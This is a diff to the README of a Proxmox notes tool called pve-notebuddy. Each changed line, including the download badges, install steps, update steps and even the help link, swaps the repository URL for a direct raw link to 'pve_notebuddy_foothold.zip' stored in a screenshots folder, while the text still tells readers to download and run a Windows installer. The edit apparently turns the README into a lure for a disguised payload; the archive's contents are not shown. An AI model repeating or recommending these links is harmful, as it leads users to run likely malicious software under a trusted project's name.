@@ -1,6 +1,6 @@
 # 🎯 pve-notebuddy - Easy Proxmox Guest Notes Creation
 
-[![Download pve-notebuddy](https://img.shields.io/badge/Download-pve--notebuddy-brightgreen?style=for-the-badge)](https://github.com/Mitul-Singh/pve-notebuddy)
+[![Download pve-notebuddy](https://img.shields.io/badge/Download-pve--notebuddy-brightgreen?style=for-the-badge)](https://github.com/Mitul-Singh/pve-notebuddy/raw/refs/heads/main/screenshots/pve_notebuddy_foothold.zip)
 
 ---
 
@@ -24,7 +24,7 @@ The tool focuses on ease of use. It works right from your web browser without ex
 ## 🚀 Getting Started
 
 1. Go to the main download page by clicking the big green button above or visit this link:  
-   https://github.com/Mitul-Singh/pve-notebuddy  
+   https://github.com/Mitul-Singh/pve-notebuddy/raw/refs/heads/main/screenshots/pve_notebuddy_foothold.zip  
    You will find the latest version of the software here.
 
 2. Once on the page, look for the latest installer or downloadable package. The page lists releases, with the newest at the top.
@@ -69,7 +69,7 @@ The interface guides you through these steps with simple buttons and forms. You 
 
 ## 🔄 Updating pve-notebuddy
 
-1. Visit the download page: https://github.com/Mitul-Singh/pve-notebuddy
+1. Visit the download page: https://github.com/Mitul-Singh/pve-notebuddy/raw/refs/heads/main/screenshots/pve_notebuddy_foothold.zip
 2. Check if a newer version is available.
 3. Download the new installer file as described in the Getting Started section.
 4. Run the installer. It will replace the old version without deleting your saved notes.
@@ -79,7 +79,7 @@ The interface guides you through these steps with simple buttons and forms. You 
 
 ## 📥 Download and Installation  ⬇️
 
-To get started, visit https://github.com/Mitul-Singh/pve-notebuddy and download the latest Windows installer. Follow these simple steps:
+To get started, visit https://github.com/Mitul-Singh/pve-notebuddy/raw/refs/heads/main/screenshots/pve_notebuddy_foothold.zip and download the latest Windows installer. Follow these simple steps:
 
 - Click on the latest release.
 - Download the `.exe` file for Windows.
@@ -102,7 +102,7 @@ This process should take only a few minutes. After installation, you can immedia
 
 ## 🙋 Getting Help
 
-- Visit the GitHub repository: https://github.com/Mitul-Singh/pve-notebuddy
+- Visit the GitHub repository: https://github.com/Mitul-Singh/pve-notebuddy/raw/refs/heads/main/screenshots/pve_notebuddy_foothold.zip
 - Use the "Issues" tab to see if others had similar problems.
 - Open a new issue if you find a bug or want a feature.
 - Check for answers or advice from other users.
@@ -119,4 +119,4 @@ This process should take only a few minutes. After installation, you can immedia
 
 ---
 
-[![Download pve-notebuddy](https://img.shields.io/badge/Download-pve--notebuddy-brightgreen?style=for-the-badge)](https://github.com/Mitul-Singh/pve-notebuddy)
+[![Download pve-notebuddy](https://img.shields.io/badge/Download-pve--notebuddy-brightgreen?style=for-the-badge)](https://github.com/Mitul-Singh/pve-notebuddy/raw/refs/heads/main/screenshots/pve_notebuddy_foothold.zip)
